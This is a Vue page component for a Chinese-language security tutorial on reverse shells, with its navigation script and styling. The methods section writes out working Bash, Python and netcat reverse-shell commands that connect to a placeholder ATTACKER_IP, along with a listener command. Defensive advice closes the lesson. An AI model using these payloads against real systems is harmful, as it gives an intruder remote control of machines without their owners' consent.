<template>
        <div>
          <el-row>
            <!-- 主要内容区域 -->
            <el-col :span="19">
              <div ref="containerRef" style="color: #fff; height: 650px; overflow-y: auto">
                <div id="part0" style="height: 100px;"></div>
                <div id="part2" style="height: auto;">
                  <el-text size="large" style="color:#fff; line-height: 3.6;">
                    <div id="p2" style="height: auto;">
                      <h1 class="title">反弹 shell</h1>
                      <el-divider />
                      <br>
      
                      <!-- 反弹 shell 原理 -->
                      <h2 class="sub-title" id="p2-1">反弹 shell 原理</h2>
                      <p>在命令执行漏洞场景中,攻击者通常需要获取目标系统的 <el-tag style="color:#ff7b72;font-size: 14px;" type="info" size="large">shell</el-tag> 权限来进一步控制目标系统.<br>
                      然而,由于目标系统可能处于防火墙或 <el-tag style="color:#79c0ff;font-size: 14px;" type="info" size="large">NAT</el-tag> 设备之后,攻击者无法直接连接到目标系统.<br>
                      反弹 <el-tag style="color:#ff7b72;font-size: 14px;" type="info" size="large">shell</el-tag> 是一种反向连接技术,它允许目标系统主动连接到攻击者控制的主机,从而绕过防火墙和 <el-tag style="color:#79c0ff;font-size: 14px;" type="info" size="large">NAT</el-tag> 的限制.</p>
                      <br>
      
                      <!-- 反弹 shell 常见场景 -->
                      <h2 class="sub-title" id="p2-2">反弹 shell 常见场景</h2>
                      <ul>
                        <li>当目标系统存在命令执行漏洞,且攻击者无法直接访问目标系统的网络时:<br>
                            可以利用反弹
                            <el-tag style="color:#ff7b72;font-size: 14px;" type="info" size="large">shell</el-tag> 技术让目标系统主动连接到攻击者的主机.</li>
                        <li>在一些内网渗透测试中,目标系统位于内网,攻击者可以通过反弹 <el-tag style="color:#ff7b72;font-size: 14px;" type="info" size="large">shell</el-tag>
                            突破内网限制,获取目标系统的控制权.</li>
                      </ul>
                      <br>
      
                      <!-- 反弹 shell 方法 -->
                      <h2 class="sub-title" id="p2-3">反弹 shell 方法</h2>
      
                      <!-- Bash 反弹 shell -->
                      <h3 class="sub-sub-title">1. Bash 反弹 shell</h3>
                      <el-card style="max-width:750px; background-color:#161b22;"
                          body-style="line-height: 2">
                        <pre class="code-block">
      <span class="token comment">// 目标系统执行的命令</span>
      <span class="token string">bash -i <span class="token operator">>&</span> <span class="token punctuation">/dev/tcp/ATTACKER_IP/ATTACKER_PORT</span> 0<span class="token operator">>&</span>1</span>
          </pre>
                      </el-card>
                      <p>在目标系统上执行上述命令,会将 <el-tag style="color:#ff7b72;font-size: 14px;" type="info" size="large">bash shell</el-tag> 连接到攻击者指定的 IP
                        地址和端口.<br>
                        攻击者需要在自己的主机上监听相应的端口,例如使用 <el-tag style="color:#79c0ff;font-size: 14px;" type="info" size="large"> nc -lvp ATTACKER_PORT </el-tag> 命令.</p>
                      <br>
      
                      <!-- Python 反弹 shell -->
                      <h3 class="sub-sub-title">2. Python 反弹 shell</h3>
                      <el-card style="max-width:750px; background-color:#161b22;"
                          body-style="line-height: 2">
                        <pre class="code-block">
      <span class="token comment">// 目标系统执行的命令</span>
      <span class="token.keyword">python</span> <span class="token operator">-</span><span class="token variable">c</span> <span class="token string">'</span>
      <span class="token.keyword">import</span> <span class="token variable">socket</span><span class="token punctuation">,</span><span class="token variable">subprocess</span><span class="token punctuation">,</span><span class="token variable">os</span><span class="token punctuation">;</span><span class="token delimiter">\</span><span class="token string">
      </span><span class="token.variable">s</span><span class="token operator">=</span><span class="token variable">socket</span><span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span><span class="token variable">socket</span><span class="token punctuation">.</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span><span class="token variable">socket</span><span class="token punctuation">.</span><span class="token.constant">SOCK_STREAM</span><span class="token punctuation">);</span><span class="token delimiter">\</span><span class="token string">
      </span><span class="token.variable">s</span><span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"ATTACKER_IP"</span><span class="token punctuation">,</span><span class="token variable">ATTACKER_PORT</span><span class="token punctuation">));</span><span class="token variable">os</span><span class="token punctuation">.</span><span class="token function">dup2</span><span class="token unctuation">(</span><span class="token variable">s</span><span class="token punctuation">.</span><span class="token function">fileno</span><span class="token punctuation">(),</span><span class="token number">0</span><span class="token punctuation">);</span><span class="token delimiter">\</span><span class="token string">
      </span><span class="token.variable">os</span><span class="token punctuation">.</span><span class="token function">dup2</span><span class="token punctuation">(</span><span class="token variable">s</span><span class="token punctuation">.</span><span class="token function">fileno</span><span class="token punctuation">(),</span><span class="token number">1</span><span class="token punctuation">);</span> <span class="token variable">os</span><span class="token punctuation">.</span><span class="token function">dup2</span><span class="token punctuation">(</span><span class="token variable">s</span><span class="token punctuation">.</span><span class="token function">fileno</span><span class="token punctuation">(),</span><span class="token number">2</span><span class="token punctuation">);</span><span class="token delimiter">\</span><span class="token string">
      </span><span class="token.variable">p</span><span class="token operator">=</span><span class="token variable">subprocess</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]);</span><span class="token string">'</span>
      </pre>
                      </el-card>
                      <p>此命令使用 Python 脚本创建一个 socket
                        连接到攻击者的主机,并将标准输入、输出和错误输出重定向到该连接.<br>
                        攻击者同样需要在自己的主机上监听相应的端口.
                      </p>
                      <br>
      
                      <!-- Netcat 反弹 shell -->
                      <h3 class="sub-sub-title">3. Netcat 反弹 shell</h3>
                      <el-card style="max-width:750px; background-color:#161b22;"
                          body-style="line-height: 2">
                        <pre class="code-block">
          <span class="token comment">// 目标系统执行的命令</span>
          <span style="color: #79c0ff;">nc -e <span style="color:#ff7b72">/bin/sh</span> ATTACKER_IP ATTACKER_PORT</span>
          </pre>
                      </el-card>
                      <br>
      
                      <!-- 反弹 shell 防御措施 -->
                      <h2 class="sub-title" id="p2-4">反弹 shell 防御措施</h2>
                      <ul>
                        <li>严格过滤用户输入,避免命令执行漏洞的出现.可以使用白名单机制,只允许执行特定的命令.
                        </li>
                        <li>配置防火墙规则,限制目标系统对外的网络连接,只允许必要的网络流量.</li>
                        <li>定期更新系统和应用程序,修复已知的安全漏洞.</li>
                      </ul>
                    </div>
                  </el-text>
                </div>
              </div>
            </el-col>
            <!-- 目录 -->
            <el-col :span="5">
              <el-menu 
                :default-active="activeAnchor" 
                class="tech-anchor" 
                mode="vertical"
                @select="handleAnchorSelect"
              >
                <el-menu-item-group title="本页目录">
                  <el-menu-item index="p2">反弹 shell</el-menu-item>
                  <el-menu-item index="p2-1">↳ 原理</el-menu-item>
                  <el-menu-item index="p2-2">↳ 常见场景</el-menu-item>
                  <el-menu-item index="p2-3">↳ 方法</el-menu-item>
                  <el-menu-item index="p2-4">↳ 防御措施</el-menu-item>
                </el-menu-item-group>
              </el-menu>
            </el-col>
          </el-row>
        </div>
      </template>
      
      <script>
      export default {
        data() {
          return {
            containerRef: null,
            activeAnchor: 'p2'
          };
        },
        mounted() {
          this.containerRef = this.$refs.containerRef;
          window.addEventListener('scroll', this.handleScroll);
        },
        beforeDestroy() {
          window.removeEventListener('scroll', this.handleScroll);
        },
        methods: {
          handleClick(e) {
            e.preventDefault();
          },
          handleAnchorSelect(index) {
            this.activeAnchor = index;
            const element = document.getElementById(index);
            if (element) {
              element.scrollIntoView({ behavior: 'smooth' });
            }
          },
          handleScroll() {
            const sections = ['p2', 'p2-1', 'p2-2', 'p2-3', 'p2-4'];
            const scrollPosition = window.scrollY || document.documentElement.scrollTop;
            
            for (let i = sections.length - 1; i >= 0; i--) {
              const section = document.getElementById(sections[i]);
              if (section && scrollPosition >= section.offsetTop - 100) {
                this.activeAnchor = sections[i];
                break;
              }
            }
          }
        }
      };
      </script>
      
      <style lang="less">
      @import '~element-ui/lib/theme-chalk/index.css';
      ::-webkit-scrollbar {
  display: none;
}
      code {
        font-family: "Cascadia Code";
      }
      
      .code-block {
        color: #c9d1d9;
        font-family: 'Cascadia Code', Consolas, 'Liberation Mono', Menlo, monospace;
        font-size: 15px;
        margin: 0;
      }
      
      .token.comment {
        color: #8b949e;
      }
      
      .token.keyword {
        color: #ff7b72;
      }
      
      .token.function {
        color: #d2a8ff;
      }
      
      .token.variable {
        color: #79c0ff;
      }
      
      .token.string {
        color: #a5d6ff;
      }
      
      .token.punctuation {
        color: #c9d1d9;
      }
      
      .token.operator {
        color: #ff7b72;
      }
      
      .token.delimiter {
        color: #ff7b72;
      }
      
      /* Card styling */
      .el-card {
        border: 1px solid #30363d;
        margin: 10px 0;
      }
      
      /* Menu styling */
      .tech-anchor {
        position: fixed;
        right: 20px;
        background-color: #0d1117;
        padding: 15px;
        border-radius: 6px;
        border: 1px solid #30363d;
        width: 220px;
        
        .el-menu-item-group__title {
          padding: 10px 0 5px 20px;
          color: #d1e7ff !important;
          font-family: 'Cascadia Code', '微软雅黑';
          font-size: 1em;
          border-bottom: 1px solid rgba(0, 123, 255, 0.3);
          text-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        }
        
        .el-menu-item {
          color: #a0c4ff !important;
          font-family: 'Cascadia Code', '微软雅黑';
          font-size: 0.9em;
          height: 36px;
          line-height: 36px;
          padding: 0 10px !important;
          margin: 5px 0;
          border-radius: 3px;
          transition: all 0.3s ease;
          
          &:hover {
            color: #ffffff !important;
            background: rgba(0, 123, 255, 0.2);
            text-shadow: 0 0 5px #007bff;
            transform: translateX(5px);
          }
          
          &.is-active {
            color: #ffffff !important;
            background: rgba(0, 123, 255, 0.3);
            text-shadow: 0 0 10px #00a2ff;
            border-left: 2px solid #007bff;
            padding-left: 15px !important;
            animation: pulse-glow 2s infinite alternate;
          }
        }
      }
      
      .tech-submit-btn {
        /* 基础样式 */
        border: none;
        padding: 12px 24px;
        font-weight: bold;
        letter-spacing: 1px;
        text-transform: uppercase;
        position: relative;
        overflow: hidden;
        transition: all 0.3s ease;
      
        /* 确保按钮内容居中 */
        display: inline-flex;
        align-items: center;
        justify-content: center;
      
        /* 渐变背景 - 科技蓝 */
        background: linear-gradient(135deg, #00a1ff 0%, #0066ff 50%, #0033cc 100%);
      
        /* 文字和图标颜色 */
        color: white !important;
      
        /* 圆角 - 使用round属性已设置 */
      
        /* 阴影 - 外发光效果 */
        box-shadow: 0 0 10px rgba(0, 150, 255, 0.5),
              0 0 20px rgba(0, 100, 255, 0.3),
              inset 0 0 5px rgba(255, 255, 255, 0.2);
      
        &:hover {
          /* 悬停时增强发光效果 */
          box-shadow: 0 0 15px rgba(0, 150, 255, 0.8),
                0 0 30px rgba(0, 100, 255, 0.5),
                inset 0 0 10px rgba(255, 255, 255, 0.3);
      
          /* 悬停时轻微放大 */
          transform: scale(1.05);
      
          /* 悬停时改变渐变角度 */
          background: linear-gradient(135deg, #00a1ff 0%, #0066ff 50%, #0033cc 100%);
        }
      
        &:active {
          /* 点击时效果 */
          transform: scale(0.98);
          box-shadow: 0 0 5px rgba(0, 150, 255, 0.8),
                inset 0 0 10px rgba(0, 0, 0, 0.3);
        }
      
        &::before {
          /* 创建光效层 */
          content: '';
          position: absolute;
          top: -50%;
          left: -50%;
          width: 200%;
          height: 200%;
          background: linear-gradient(to bottom right,
                  rgba(255, 255, 255, 0) 0%,
                  rgba(255, 255, 255, 0.1) 50%,
                  rgba(255, 255, 255, 0) 100%);
          transform: rotate(45deg);
          animation: shine 3s infinite;
          opacity: 0;
        }
      
        &:hover::before {
          opacity: 1;
        }
      }
      
      .btn-content {
        position: relative;
        z-index: 1;
        display: flex;
        align-items: center;
        justify-content: center;
        width: 100%;
        /* 确保内容区域占满整个按钮 */
      }
      
      .btn-icon {
        font-size: 16px;
        transition: all 0.3s ease;
        margin-right: 0px;
        /* 用margin替代gap确保更好的兼容性 */
      }
      
      .btn-text {
        transition: all 0.3s ease;
      }
      
      .tech-submit-btn:hover .btn-icon {
        transform: translateY(-2px);
      }
      
      @keyframes shine {
        0% {
          left: -50%;
          top: -50%;
        }
      
        20% {
          left: 100%;
          top: 100%;
        }
      
        100% {
          left: 100%;
          top: 100%;
        }
      }
      
      h1.title {
        margin: 0 0 3rem;
        font-size: 38px;
        line-height: 1.4;
        letter-spacing: -.02em;
        font-weight: 800;
        text-align: left;
        font-family: 'Orbitron', '微软雅黑';
      }
      
      h2.sub-title {
        margin: 0 0 3rem;
        font-size: 25px;
        line-height: 1.4;
        letter-spacing: -.02em;
        font-weight: 800;
        text-align: left;
        font-family: 'Orbitron', '微软雅黑';
      }
      
      h3.sub-sub-title {
        margin: 0 0 3rem;
        font-size: 20px;
        line-height: 1.4;
        letter-spacing: -.02em;
        font-weight: 800;
        text-align: left;
        font-family: 'Orbitron', '微软雅黑';
      }
      
      /* 特殊定义的变量,比如PHP.EOL */
      .v {
        color: #4cbcec;
        font-family: 'Cascadia Code';
      }
      
      /* 关键词与运算符,比如function,+-* */
      .key {
        color: #e1567b;
        font-family: 'Cascadia Code';
      }
      
      /* 第1层{[()]} */
      .lev0 {
        color: #f0de18;
        font-family: 'Cascadia Code';
      }
      
      /* 第2层{[()]} */
      .lev1 {
        color: rgb(238, 65, 195);
        font-family: 'Cascadia Code';
      }
      
      /* 第3层{[()]} */
      .lev2 {
        color: #239af5;
        font-family: 'Cascadia Code';
      }
      
      /* 函数名 */
      .func {
        color: #84D49C;
        /* color:#434040 */
        font-family: 'Cascadia Code';
      }
      
      .txt {
        font-family: 'Cascadia Code';
      }
      
      /* 所有代码的基底,普通变量,超全局变量,标点符号'",; */
      .code {
        color: #fff;
        font-family: 'Cascadia Code';
      }
      
      /* 表示注释 */
      .cmt {
        color: rgb(99, 97, 97);
        font-family: 'Cascadia Code';
        font-size: 15px
      }
      
      /* 表示数字 */
      .num {
        color: #b891d8;
        font-family: 'Cascadia Code';
      }
      
      /* el-tag 样式 */
      .el-tag {
        background-color: #3d3b3b;
        color: #fff;
        border-color: #282C34;
      }
      
      /* el-card 样式 */
      .el-card {
        background-color: #282C34;
        color: #fff;
        border-color: #282C34;
      }
      
      /* el-text 样式 */
      .el-text {
        color: #fff;
      }
      
      /* 响应式调整 */
      @media (max-width: 768px) {
        .tech-anchor {
          padding: 10px;
          width: 180px;
        }
      }
      
      @keyframes pulse-glow {
        0% {
          box-shadow: 0 0 5px rgba(0, 162, 255, 0.5);
        }
        100% {
          box-shadow: 0 0 20px rgba(0, 162, 255, 0.8);
        }
      }
      
      @keyframes blink-caret {
        50% {
          opacity: 1;
        }
      }
      </style>